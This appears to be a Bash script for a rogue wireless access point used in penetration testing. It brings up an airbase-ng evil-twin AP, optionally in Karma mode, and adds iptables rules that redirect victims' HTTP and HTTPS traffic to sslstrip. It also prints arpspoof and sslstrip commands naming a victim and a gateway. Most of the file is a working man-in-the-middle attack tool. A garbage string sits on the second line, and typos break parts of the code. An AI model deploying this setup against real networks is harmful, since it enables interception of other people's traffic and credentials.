#!/bin/bash
kedfzesbilfseBltgbaeuiltlUIETL
##############################################
# Do all prerun variables and safty measures #
# before anything else starts happening      #
##############################################

if [[ $(whoami) != 'root'  ]]; then # Verify we are root if not exit
	echo "$WARN Please Run This Script As Root or With Sudo!"
	exit 0
fi

#retrieve absolute path structures so we can use symlinks and config files
SOURCE="${BASH_SOURCE[0]}"

while [[ -h "$SOURCE" ]]; do # resolve $SOURCE until the file is no longer a symlink
	DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"
	SOURCE="$(readlink "$SOURCE")"
	[[ $SOURCE != /* ]] && SOURCE="$DIR/$SOURCE" # if $SOURCE was a relative symlink, we need to resolve it's relativeness to the path where the symlink file was located
done

DIR="$( cd -P "$( dirname "$SOURCE" )" && pwd )"

if [[ -n $1 ]]; then
	if [[ $1 == '-h' || $1 == '--help' ]]; then # yeah this is that help menu
		echo -e "Useage: n4p [mode] [option] [option]
		where: mode
			-f 				fast setup
			--fast			fast setup
		Where: option 1
			-b 				Bridged mode
			--bridge 		Bridged mode
			-d 				DHCPD enabled
			--dhcpd 		DHCPD enabled
		Where: option 2
			-s 				Use SSL Strip
			--sslstrip 		Use SSL Strip"
		exit 0
	# If any fast options were used predefine there variables now
	elif [[ $1 == '-f' || $1 == '--fast' ]]; then
		FAST="True"
		FAST_HOSTAPD="True"
		
		if [[ $2 == '-b' || $2 == '--bridge' ]]; then
			BRIDGED="True"
		elif [[ $2 == '-d' || $2 == '--dhcpd' ]]; then
			FAST_DHCPD="TRUE"
		else
			echo "Invalid option see --help"
			exit 0
		fi
		
		if [[ $3 == '-s' || $3 == '--sslstrip' ]]; then
			FAST_SSLSTRIP="True"
		elif [[ -n $3 ]]; then
			echo "Invalid option see --help"
			exit 0
		fi
	else
		echo "Invalid option see --help"
		exit 0
	fi
fi

#######################################
# Building a sane working environment #
#######################################
depends()
{
	IPT="/sbin/iptables"
	RESERVD="10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 127.0.0.0/8 169.254.0.0/16"
	DHCP="-t nat"
	LAN2="eth1"
	LAN="eth0"
	WLAN="wlan0"
	WAN="-t nat"
	AP="at0"
	MON="wlan0mon"
	VPN="tun0"
	VPNI="tap+"
	# Text color variables
	TXT_UND=$(tput sgr 0 1)          # Underline
	TXT_BLD=$(tput bold)             # Bold
	BLD_RED=${txtbld}$(tput setaf 1) #  red
	BLD_YEL=${txtbld}$(tput setaf 2) #  Yellow
	BLD_ORA=${txtbld}$(tput setaf 3) #  orange
	BLD_BLU=${txtbld}$(tput setaf 4) #  blue
	BLD_PUR=${txtbld}$(tput setaf 5) #  purple
	BLD_TEA=${txtbld}$(tput setaf 6) #  teal
	BLD_WHT=${txtbld}$(tput setaf 7) #  white
	TXT_RST=$(tput sgr0)             # Reset
	INF_O=${BLD_WHT}*${TXT_RST}        # Feedback
	PASS="${BLD_TEA}[${TXT_RSR}${BLD_WHT} OK ${TXT_RST}${BLD_TEA}]${TXT_RST}"
	WARN="${BLD_TEA}[${TXT_RST}${BLD_PUR} * ${TXT_RST}${BLD_TEA}]${TXT_RST}"
	QUES=${BLD_BLU}?${TXT_RST}
	# start text with ^ variable and end the text with $(tput sgr0)
}

banner()
{ 
	echo "${BLD_TEA}$(cat $DIR/auth)${TXT_RST}"; sleep 1
}

setupenv()
{
	# Checked for orphaned processes then sanitize them
	if [[ -n $(ps -A | grep -i airbase) ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; killall airbase-ng; fi
	
	if [[ -n $(ip addr | grep -i "$MON") ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; airmon-zc stop $MON; fi
	
	sessionfolder=/tmp/n4p #set our tmp working configuration directory and then build config files
	if [ ! -d "$sessionfolder" ]; then mkdir "$sessionfolder"; fi
	mkdir -p "$sessionfolder" "$sessionfolder/logs"
	if [[ -n $(rfkill list | grep yes) ]]; then #if I think of a better way to do this then update this feature to be more comprehensive
  		rfkill unblock 0
	fi
}

# Use error checking for exacution of external commands and report
step() {
    echo -n "$@"

    STEP_OK=0
    [[ -w $sessionfolder/logs ]] && echo -e $STEP_OK > $sessionfolder/logs/step.$$
}

try() {
    # Check for `-b' argument to run command in the background.
    local BG=

    [[ $1 == -b ]] && { BG=1; shift; }
    [[ $1 == -- ]] && {       shift; }

    # Run the command.
    if [[ -z $BG ]]; then
        "$@"
    else
        "$@" &
    fi

    # Check if command failed and update $STEP_OK if so.
    local EXIT_CODE=$?

    if [[ $EXIT_CODE -ne 0 ]]; then
        STEP_OK=$EXIT_CODE
        [[ -w $sessionfolder/logs ]] && echo $STEP_OK > $sessionfolder/logs/step.$$

        if [[ -n $LOG_STEPS ]]; then
            local FILE=$(readlink -m "${BASH_SOURCE[1]}")
            local LINE=${BASH_LINENO[0]}
            echo -e "$FILE: line $LINE: Command \`$*' failed with exit code $EXIT_CODE." >> "$LOG_STEPS"
        fi
    fi
    return $EXIT_CODE
}

next() {
    [[ -f $sessionfolder/logs/step.$$ ]] && { STEP_OK=$(< $sessionfolder/logs/step.$$); rm -f $sessionfolder/logs/step.$$; }
    [[ $STEP_OK == 0 ]] && echo -e "$1	$PASS" || echo -e "$1	$WARN"
    echo
    return $STEP_OK
}

settings()
{
	if [[ -z $FAST ]]; then
		echo -e "${BLD_WHT}
		+==============================================+
		|           Listing Network Devices            |
		+==============================================+${TXT_RST}"
		try ip addr
		echo "${BLD_ORA}***************************************************************************************${TXT_RST}"
		echo "Press Enter for defaults"
		read -p "What is your Internet or default interface? [eth0]: " LAN
		if [[ -z $LAN ]]; then LAN="eth0"; fi

		read -p "What is your default Wireless interface? [wlan0]: " WLAN
		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi

		read -p "AP configuration Press enter for defaults or 1 for custom AP attributes: " ATTRIBUTES
		if [[ $ATTRIBUTES != 1 ]]; then
			ESSID="Pentoo"
			CHAN="1"
			BEACON="100"
			PPS="100"
		else
			echo "$WARN WEP & WPA are supplied in the config file." # I chose not to script them in as most people will not use them
			read -p "What SSID Do You Want To Use [Pentoo]: " ESSID
			if [[ -z $ESSID ]]; then ESSID="Pentoo"; fi
			
			read -p "What CHANNEL Do You Want To Use [1]: " CHAN
			if [[ -z $CHAN ]]; then CHAN="1"; fi
			
			read -p "Beacon Intervals [100]: " BEACON
			if [[ -z $BEACON ]]; then 
				BEACON="100"
			elif (( ($BEACON < 10) )); then 
				BEACON="100"
			fi
			
			read -p "Packets Per Second [100]: " PPS
			if [[ -z $PPS ]]; then PPS="100"; fi
			
			if (( ($PPS < 100) )); then PPS="100"; fi
		fi
	else
		if [[ -z $LAN ]]; then LAN="eth0"; fi
		
		if [[ -z $WLAN ]]; then WLAN="wlan0"; fi

		if [[ -e /etc/init.d/net.$WLAN ]]; then
			if [[ $(/etc/init.d/net.$WLAN status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
				/etc/init.d/net.$WLAN stop
			fi
		fi
		ip link set $WLAN down # No need for extra verification code just force the device down even if it's alread down
		iwconfig $WLAN mode managed #Force managed mode upon wlan because there is a glitch that can block airmon from bringing the interface up if not previously done
		ESSID="Pentoo"
		CHAN="1"
		BEACON="100"
		PPS="100"
	fi
}

keepalive()
{
	read -e -p "$WARN Press ctrl+c when you are ready to go down!" ALLINTHEFAMILY # Protect this script from going down hastily
	if [[ $ALLINTHEFAMILY != 'cuilewhnc78hc4ohfbP7YR;JNd3F92PHBF23' ]]; then clear; keepalive; fi
}

killemAll()
{
	echo -e "\n\n$WARN The script has died. Major network configurations have been modified.\nWe must go down cleanly or your system will be left in a broken state!"
	if [[ -e /etc/init.d/net.$AP ]]; then
		if [[ $(/etc/init.d/net.$AP status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
			/etc/init.d/net.$AP stop
		fi
	fi
	pkill airbase-ng
	airmon-zc stop $MON

	if [[ $BRIDGED == 'True' ]]; then
		if [[ $(/etc/init.d/net.$BRIDGE status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
			try /etc/init.d/net.$BRIDGE stop
		fi
		if [[ $(ip addr list | grep -i $BRDIGE | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) != 'DOWN' ]]; then
			ip link set $BRDIGE down
		fi
		brctl delbr $BRIDGE
		brctl show
	fi
	rebuild_network
	fw_down
	echo "$PASS The environment is now sanitized cya"
	exit 0
}

rebuild_network()
{
	echo "$WARN It's now time to bring your default network interface back up"
	echo -e "${BLD_WHT}
	+==================================+
	| 1) Use eth0                      |
	| 2) Use wlan0                     |
	+==================================+${TXT_RST}"
	read -p "Option: " MENU_REBUILD_NETWORK
	if [[ $MENU_REBUILD_NETWORK == 1 ]]; then
		if [[ $(/etc/init.d/net.$LAN status | sed 's/* status: //g' | cut -d ' ' -f 2) != 'started' ]]; then 
			if [[ $(ip addr list | grep -i $LAN | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) == 'DOWN' ]]; then
				ip link set $LAN up
			fi
			/etc/init.d/net.$LAN start
		fi
	else 
		clear
		echo "$WARN Invalid option"
		rebuild_network
	fi
	return 0
}
trap killemAll INT HUP;

##################################################################
###############Setup for Airbase-ng and airmon-zc#################
##################################################################
startairbase()
{
	while [[ $(try ip addr list | grep -i $WLAN | grep -i DOWN | awk -Fstate '{print $2}' | cut -d ' ' -f 2) != 'DOWN' ]]; do 
		ip link set "$WLAN" down
	done

	step "Airmon-zc comming up"
	try airmon-zc check kill
	try airmon-zc start $WLAN
	next

	if (( ($MENUCHOICE == 2) )); then
		step "STARTING SERVICE: AIRBASE-NG"
		try airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -v > $sessionfolder/logs/airbase-ng.log &
		sleep .5 ## future put this and the next line in a more comprehensive loop
		try cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
		next
	elif (( ($MENUCHOICE == 1) )); then # used elif instead of just else for more comprehensive structure so users may modify easier.
		step "$PASS STARTING SERVICE: KARMA AIRBASE-NG"
		try airbase-ng $MON -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v > $sessionfolder/logs/airbase-ng.log &
		sleep .5
		try cat $sessionfolder/logs/airbase-ng.log # I like to see things on my screen so show me the goods
		next
	fi

	step "Assigning IP and Route to $AP"
	try ip link set $AP up
	try ip addr add 10.0.0.254 broadcast 10.0.0.255 dev $AP
	try route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
	next
	AIRBASE="On"
}
#################################################################
#################Verify our DHCP and bridge needs################
#################################################################
openrc_bridge()
{
	# OpenRC needs sym links to bring the interface up. Verify they exist as needed if not make them then set proper state
	if [[ -e /etc/init.d/net.$BRIDGE ]]; then
		if [[ $("/etc/init.d/net.$BRIDGE" status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
			/etc/init.d/net.$BRIDGE stop; sleep 1; try ip link set $BRIDGE down
		fi
	else
		ln -s /etc/init.d/net.lo /etc/init.d/net.$BRIDGE
	fi
	if [[ -e /etc/init.d/net.$RESP_BR_1 ]]; then
		if [[ $("/etc/init.d/net.$RESP_BR_1" status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then
			/etc/init.d/net.$RESP_BR_1 stop; sleep 1; try ip link set $RESP_BR_1 down
		fi
	else
		ln -s /etc/init.d/net.lo /etc/init.d/net.$RESP_BR_1
	fi
	if [[ -e /etc/init.d/net.$RESP_BR_2 ]]; then
		if [[ $("/etc/init.d/net.$RESP_BR_2" status | sed 's/* status: //g' | cut -d ' ' -f 2) == 'started' ]]; then 
			/etc/init.d/net.$RESP_BR_2 stop; sleep 1; try ip link set $RESP_BR_2 down
		fi
	else
		ln -s /etc/init.d/net.lo /etc/init.d/net.$RESP_BR_2
	fi

	local CHK_IP=$(ip addr list | grep "$RESP_BR_1" | grep inet | awk '{print $2}') # This insures $RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
	if [[ -n $CHK_IP ]]; then
		ip addr del $CHK_IP dev $RESP_BR_1
	fi
	local CHK_IP=$(ip addr list | grep "$RESP_BR_2" | grep inet | awk '{print $2}') # This insures $RESP_BR_2 does not have an ip and then removes it if it does since the bridge handles this
	if [[ -n $CHK_IP ]]; then
		ip addr del $CHK_IP dev $RESP_BR_2
	fi

	step "Building $BRIDGE now with $BRIDGE RESP_BR_2 $BRIDGE_RESP_BR_1"
	try iw dev $RESP_BR_2 set 4addr on
	try ip link set $RESP_BR_2 up
	try ip link set $RESP_BR_1 up
	try brctl addbr $BRIDGE
	try brctl addif $BRIDGE $RESP_BR_1
	try brctl addif $BRIDGE $RESP_BR_2
	try ip link set $BRIDGE up
	next
}

fbridge()
{
	if [[ -z $FAST ]]; then
		if [[ -z $BRIDGED ]]; then
			read -p "Would you like me to bridge this AP? If no thats ok we can use ip_forward in iptables (y/n) " RESP_BR
			if [[ $RESP_BR == [yY] ]]; then
				read -p "$WARN Create the arbitrary name of your bridge, e.g. br0: " BRIDGE
				if [[ -z $BRIDGE ]]; then BRIDGE=br0; fi
				echo -e "$PASS We need to setup the interfaces you are going to use with $BRIDGE \n e.g. $LAN and $AP, here are your possible choices"
				echo "${BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"
				ip addr
				echo "{BLD_ORA}!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!${TXT_RST}"
				read -p "$WARN Please tell me the first interface to use: " RESP_BR_1
				if [[ -z $RESP_BR_1 ]]; then RESP_BR_1=$LAN; fi
				read -p "$WARN Please tell me the second interface to use: " RESP_BR_2
				if [[ -z $RESP_BR_2 ]]; then # Run default check to verify what our default interface should be encase the user forgot to set this properly.
					if [[ $AIRBASE == 'On' ]]; then
						RESP_BR_2=$AP
					else
						RESP_BR_2=$WLAN 
					fi
				fi
				BRIDGED="True"
				openrc_bridge
			elif [[ $RESP_BR == [nN] ]]; then
				BRIDGED="False"
			else	
				clear; echo "Invalid option"; fbridge
			fi
		fi
	elif [[ $BRIDGED == 'True' ]]; then # If we are here then $FAST -f was enabled with $3 -b
		BRIDGE=br0
		RESP_BR_1=$LAN
		if [[ -n $FAST_AIRBASE ]]; then
			RESP_BR_2=$AP
		elif [[ -n $FAST_HOSTAPD ]]; then
			RESP_BR_2=$WLAN
		fi
		openrc_bridge
	fi
}

dhcp()
{
	if [[ -n $(cat /etc/dhcp/dhcpd.conf | grep -i Pentesters_AP | awk {'print $2'}) ]]; then
		if [[ $BRIDGED == 'False' ]]; then
			if [[ -e /etc/init.d/net.$AP ]]; then
				rm	/etc/init.d/net.$AP # We cant have this when assigning static routes
			fi
			/etc/init.d/dhcpd restart
		else
			/etc/init.d/net.$BRIDGE start
		fi
	else # We apparently don't have the proper configuration file. Make the changes and try again
		find * -wholename $DIR/dhcpd.conf -exec cat {} >> /etc/dhcp/dhcpd.conf \;
		dhcp
	fi
}

##################################################################
######################Build the firewall##########################
##################################################################
fw_pre_services()
{
	if [[ -z $FAST ]]; then
		read -p "Would you like to enable the configured server services such as ssh httpd? (y/n) " RESP
		if [[ $RESP == [yY] ]]; then
			fw_services
		elif [[ $RESP != [nN] ]]; then
			clear; echo "$WARN Bad input"; fw_pre_services
		fi

		read -p "$PASS Would you like to turn on OpenVPN now? (y/n) " RESP
		if [[ $RESP == [yY] ]]; then
			fw_vpn;	
		elif [[ $RESP != [nN] ]]; then
			clear; echo "$WARN Bad input"
			fw_pre_services
		fi
	fi
}

fw_redundant()
{
	## Flush rules
	echo "Flushing old rules"
	/etc/init.d/iptables stop
	$IPT -F
	$IPT $WAN -F
	$IPT --delete-chain
	$IPT $WAN --delete-chain
	$IPT -t filter --flush FORWARD
	$IPT -t filter --flush INPUT

	# Set default policies for all three default chains
	step "$WARN Setting default policies"
	try $IPT -P OUTPUT ACCEPT
	next

	step "$WARN We will allow ip forwarding"
	echo 1 > /proc/sys/net/ipv4/ip_forward
	try $IPT -P FORWARD ACCEPT
	try $IPT -F FORWARD
	next

	# Enable free use of loopback interfaces
	step "$WARN  Allowing loopback devices"
	try $IPT -A INPUT -i lo -j ACCEPT
	try $IPT -A OUTPUT -o lo -j ACCEPT
	next

	## permit local network
	step "$WARN  Permit local network"
	try $IPT -A INPUT -i $LAN -j ACCEPT
	try $IPT -A OUTPUT -o $LAN -j ACCEPT
	next

	## DHCP
	step "$WARN  Allowing DHCP server"
	try $IPT -A INPUT $WAN -p udp --sport 67 --dport 68 -j ACCEPT
	next

	## Allow Samba
	step "$WARN Configuring Samba"
	try $IPT -A INPUT -i $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	try $IPT -A INPUT -i $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	try $IPT -A OUTPUT -o $LAN -p tcp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	try $IPT -A OUTPUT -o $LAN -p udp -m multiport --dports 445,135,136,137,138,139 -j ACCEPT
	next
	fw_pre_services
}

fw_services()
{
	## Allow DNS Server
	step "$WARN Allowing dns on port 53"
	try $IPT -A INPUT $WAN -p udp -m udp --dport 53 -j ACCEPT
	next

	## SSH (allows SSH to firewall, from anywhere on the WAN)
	step "$WARN Allowing ssh on port 22"
	try $IPT -A INPUT $WAN -p tcp --dport 22 -j ACCEPT
	next

	## Web server
	step "$WARN Allowing http on port 80 and https on 443"
	try $IPT -A INPUT $WAN -p tcp -m multiport --dports 80,443 -j ACCEPT
	next
}

vpn_confirmed()
{
	#Allow TUN interface connections to OpenVPN server
	step "$WARN Allowing openVPN"
	try $IPT -A INPUT -i $VPN -j ACCEPT
	#allow TUN interface connections to be forwarded through other interfaces
	try $IPT -A FORWARD -i $VPN -j ACCEPT
	# Allow TAP interface connections to OpenVPN server
	try $IPT -A INPUT -i $VPNI -j ACCEPT
	# Allow TAP interface connections to be forwarded through other interfaces
	try $IPT -A FORWARD -i $VPNI -j ACCEPT
	next
	# I've been called into action
	step "OpenRC now bringing up OpenVPN"
	try /etc/init.d/openvpn start
	next
}

fw_vpn()
{
	echo "$WARN Please pay close attention to the following when considering turning on openvpn."
	echo "$WARN The gateway is still broken for dual nics wile hosting services." # Do some work on custom gateway routing for this soon 10-22-2013"
	echo "$WARN Be careful the VPN configuration could break your gateway for MiTM attacks and remote services."
	echo "$PASS This will be fixed in the future."
	echo " You're advised not to use the vpn during attacks and only operate during daily activity at this time 10-29-2013"
	read -p "$PASS Do you still want to turn on OpenVPN now? (y/n) " RESP
	if [[ $RESP == [yY] ]]; then 
		vpn_confirmed; 
	elif [[ $RESP != [nN] ]]; then
		clear; echo "$WARN Bad input"
		fw_vpn
	fi
}

fw_closure()
{
	## drop everything else arriving from WAN on local interfaces
	step "$WARN Drop everything else"
	try $IPT -A INPUT -i $LAN -j LOG
	try $IPT -A INPUT -i $LAN -j DROP
	next
	#
	# Save settings
	#
	step "$WARN Saving settings and bringing iptables back online"
	try /etc/init.d/iptables save
	try /etc/init.d/iptables start
	next

	## list the iptables rules as confirmation
	step "$WARN Listing the iptables rules as confirmation"
	try $IPT -L -v
	next
}

fw_up()
{ 
	fw_redundant
	echo -e "$PASS It's time for specialty hacking configurations"
	echo -e "These settings are not default as they may break daily activity.\nDaily rules will automagically be rebuilt when you're done hacking all the things"
	if [[ $BRIDGED == 'False' ]]; then
		$IPT $WAN -A POSTROUTING -o $LAN -j MASQUERADE
		if [[ $AIRBASE == 'On' ]]; then
			step "$WARN Allowing wirless for airbase, routing $AP through $LAN be sure airbase was configured for $AP and $LAN as the output otherwise adjust these settings"
			try $IPT -A FORWARD -i $AP -o $LAN -j ACCEPT
			try $IPT -A FORWARD -i $LAN -o $AP -j ACCEPT
			next
		else
			step "$WARN Allowing wireless for hostapd, routing $WLAN through $LAN\nbe sure hostapd was configured for $WLAN and $LAN as the output\notherwise adjust these settings"
			try $IPT -A FORWARD -i $WLAN -o $LAN -j ACCEPT
			try $IPT -A FORWARD -i $LAN -o $WLAN -j ACCEPT
			next
		fi
	fi

	if [[ -n $FAST_SSLSTRIP ]]; then
		step "Fast mode sslstrip"
		try $IPT $WAN -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
		try $IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
		try $IPT $WAN -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:10000
		try $IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
		next
	else	
		read -p "$PASS Are we using sslstrip? (y/n) " RESP
		if [[ $RESP == [yY] ]]; then
			step "$WARN Forwarding nat traffic to sslstrip server on p10000"
			try $IPT $WAN -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
			try $IPT $WAN -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 10000
			try $IPT $WAN -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:10000
			try $IPT $WAN -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:10000
			next

			echo -e "\n$WARN Here are some reminders, first setup spoofing. This will be automagic in the future"
			echo -e "\n$PASS arpspoof -i wlan0/eth0 192.168.1.10 192.168.1.1 \n where 192.168.1.10 is the victim and 192.168.1.1 is the gateway ip address."
			echo -e "\nThis means on this interface intercept traffic from *.10 that is using gateway *.1 \n * now run sslstrip"
			echo -e "\n$PASS python /usr/lib64/sslstrip/sslstrip.py -k -f lock.ico \n * load sslstrip and use the provided lock.ico icon as a replacement if need be."
			echo -e "\nIf you setup ettercap for MiTM arp spoofing you don't need arpspoof. You must manually edit the ettercap config for this.\n Or just run ettercap and let it sniff arpspoof+sslstrips work"
		elif [[ $RESP != [nN] ]]; then
			clear; echo "$WARN Bad input"; fw_up
		fi
	fi
	fw_closure
}

fw_down()
{ 
	fw_redundant
	echo "$WARN You are no longer bridged! If you need bridging still you must add that rule yourself."
	echo "$PASS Defaults loaded for daily use."
	fw_closure
}
##################################################################
########################Start the menu############################
##################################################################
menu()
{
	if [[ -n $FAST ]]; then
		MENUCHOICE="2"
	else
		echo "${BLD_ORA}
		+===================================+
		| 1) Airbase-NG WITH KARMA          |
		| 2) Airbase-NG NO KARMA            |
		+===================================+${TXT_RST}"
		read -e -p "Option: " MENUCHOICE
	fi
	
	if (( ( $MENUCHOICE == 1 ) || ( $MENUCHOICE == 2 ) )); then
		startairbase; fbridge; fw_up; dhcp; keepalive
	else 
		clear; echo "$WARN Invalid option"; menu
	fi
}
go()
{
	depends
	banner
	setupenv
	settings
	menu
}
go